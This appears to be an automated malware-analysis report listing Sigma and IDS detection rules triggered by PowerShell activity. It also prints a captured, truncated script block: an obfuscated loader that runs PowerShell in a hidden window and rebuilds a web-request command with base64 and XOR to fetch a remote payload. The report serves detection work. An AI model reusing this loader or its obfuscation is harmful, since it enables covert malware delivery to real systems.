sigma_analysis_results.rule_description: Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, Anton Kutepov, oscd.community

sigma_analysis_results.rule_description: Detects usage of a base64 encoded "FromBase64String" cmdlet in a process command line
Detects usage of the "FromBase64String" function in the commandline which is used to decode a base64 encoded string
Detects presence of a potentially xor encoded powershell command
sigma_analysis_results.rule_author: Sami Ruohonen, Harish Segar, Tim Shelton, Teymur Kheirkhabarov, Vasiliy Burov, oscd.community, Nasreddine Bencherchali

values.ScriptBlockText: Start-Process -FilePath "powershell.exe" -WindowStyle Hidden  -ArgumentList '-NoProfile -w hidden -Command "$dATA = ([TExt.EncodIng]::UTF8.GEtSTrInG((&((-join([Convert]::FromBase64String(''j8SJj8WJj8aJ'')|%{[char]($_ -bxor 244)})) -f [char]((0x49)),[char]((0x57)),[char]((0x52))) (-join ([regex]::Matches(\"EFF3F3F7F4BDA8A8EDE8E5E3E2F4E4F5EEF7F3EEE8E9E5E8E8EFE8E8A9E4E8EAA8F3A8E6B1E1B6B3E4B0BEE4B4B4B7B5E3E2E5E4E3B6B4E4E2B4B1E5B4B6B4B0B1B7E2B3BEE2B6B4B1B2B4E2E4E6E4B0B7B7B4B3B6E2E3E1B2B0E6B3B5E2E3B5B [TRUNCATED]

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

sigma_analysis_results.rule_title: Suspicious Execution of Powershell with Base64
sigma_analysis_results.rule_description: Commandline to launch powershell with a base64 payload

sigma_analysis_results.rule_title: Potential Encoded PowerShell Patterns In CommandLine
sigma_analysis_results.rule_description: Detects specific combinations of encoding methods in PowerShell via the commandline
sigma_analysis_results.rule_author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

sigma_analysis_results.rule_title: PowerShell Script With File Upload Capabilities
sigma_analysis_results.rule_description: Detects PowerShell scripts leveraging the "Invoke-WebRequest" cmdlet to send data via either "PUT" or "POST" method.
Get the processes that are running on the local computer.

values.ScriptBlockText: Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue
Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue
Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue
Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue
Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue
Set-Alias -Name gcai -Value Get-CimAssociatedInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue
Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue
Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue
Set-Alias -Name rcms -Value Remove-cimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue
Set-Alias -Name gcms -Value Get-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue
Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue
Set-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue

ids_alerts.rule_msg: ET INFO Windows Powershell User-Agent Usage
ids_alerts.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Windows Powershell User-Agent Usage"; flow:established,to_server; http.user_agent; content:"Mozilla/"; startswith; content:") WindowsPowerShell/"; distance:0; fast_pattern; classtype:not-suspicious; sid:2033355; rev:1; metadata:attack_target Client_Endpoint, created_at 2021_07_16, deployment Perimeter, confidence High, signature_severity Informational, tag Description_Generated_By_Proofpoint_Nexus, updated_at 2021_07_16;)
